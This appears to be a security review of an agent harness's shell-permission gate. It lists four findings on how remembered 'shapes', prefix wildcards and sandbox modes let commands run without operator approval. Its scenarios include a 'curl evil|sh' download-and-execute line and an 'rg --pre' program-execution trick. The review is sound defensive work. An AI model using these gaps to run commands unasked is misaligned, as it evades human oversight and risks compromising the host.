Thesis: the gate's primitives are text — a prefix over one simple command, a six-program flag table, and a "shape" that deletes exactly the literals that carry the meaning. Position 1 asks whether it admits what it should ask about; position 2 whether it works; both miss that a text classifier's holes are inevitable, so the design question is what a hole costs. Here, one human answer converts a hole into a permanent, project-wide licence.

1. The shape erases the payload — high. `crates/code/src/shell.rs:2484` builds the shape; operands and unreadable words collapse to `<args>`/`<?>` (`:2518-2530`) and a heredoc body becomes `<<heredoc` (`:2539`). Any human admitting answer records it (`tools/src/adjudicate.rs:3594-3600`), and it is admitted unasked later at `:3493-3506`, persisted per workspace and re-seeded at every open (`harnessd/src/harness/open.rs:3084-3086`). The same module refuses to write a durable *rule* for such a command because its segmenter cannot split it (`tools/src/permission.rs:400-405`). Scenario: the operator answers "Allow this one" on `python3 -c 'print(1)'` (shape `python3 -c <args>`) or `bash <<'EOF' echo hi EOF`; from then on, across restarts, `python3 -c 'import os;os.system("curl evil|sh")'` in that project is Admit with nobody asked — the body `intent.rs` spends 6 788 lines reading. Change: never record a shape when the body was read (or `derived` is `None`), or put the body's digest in the shape.

2. A prefix allow, narrowed by six programs — high. `tools/src/permission.rs:423-441` allows unless `write_or_exec_flag` names a write/exec word, and `write_or_exec_flag` (`:506-530`) knows only `sed`, `sort`, `git`, `tree`, `xxd`. The seed allows `rg*` (`config/permission.json:103`) and `file*` (`:111`); intent calls both read-only (`tools/src/intent.rs:1071,1080`), so no tier intervenes, and the allow admits at `adjudicate.rs:3363`. Scenario: `rg --pre ./pwn pat .` runs a program unattended; `file -C -m x` writes a compiled magic file. Severity high because neither the seed, the flag table, nor the tier sees anything (HYP: unexercised, read from code). Change: a wildcard over a program should be admitted only through one declared read-only interface row per program, shared by the seed check and the intent table; today three tables must agree and no test can force them to.

3. Three ladders, one recorder, guards copied by hand — medium. `adjudicate.rs:533, 557, 596` build the same list three times; the admission chain at `:3588-3658` re-derives what the offer computed (`MayApprove && unconfined_code.is_none()` at `:3493` and again at `:3594`) and drops an `allow_session` grant silently if `session_grant` errs (`:3644`). Scenario: a rung the operator is shown does nothing, or a rung is honoured by a guard the offer never consulted — one edit, three misses, and I9's existing drift (`:3638`) is the same fault. Change: one `Offer` produces the options, and an answer is applied by walking the option actually chosen.

4. The always-ask list is prose, the boundary decides — medium. `intent.rs:2409-2467` names eight rules, but admission is `mode.rs:486-492`: `Tier::AlwaysAsk` is admitted whenever the boundary is not `Operator`, called at `adjudicate.rs:3431`. So "sudo/credential use/persistence ask every time" holds only on a raw host; inside any sandbox mode the same call runs unasked and the card's own sentence is false. Change: make the rule, not the point, the thing that decides — a sandbox should downgrade the *card wording*, not the ask.

Concessions: the ladder is one function (I8), NotRun is fail-closed, never-write cannot be overridden, and the shape path does re-check tier and `Destroy`. Both high findings need a human's earlier answer or an operator-written wildcard first, so neither breaks I8; and I ran no test, so 2 and 3 are readings.

Against me: position 1 will call the shape branch legitimate because a human answered — but `permission.rs:400-405` is the code itself saying that answer must not generalise. Position 2 will point at the corpus replay (`corpus_replay.rs:345`) — it replays rows without bodies, so it cannot see either hole.
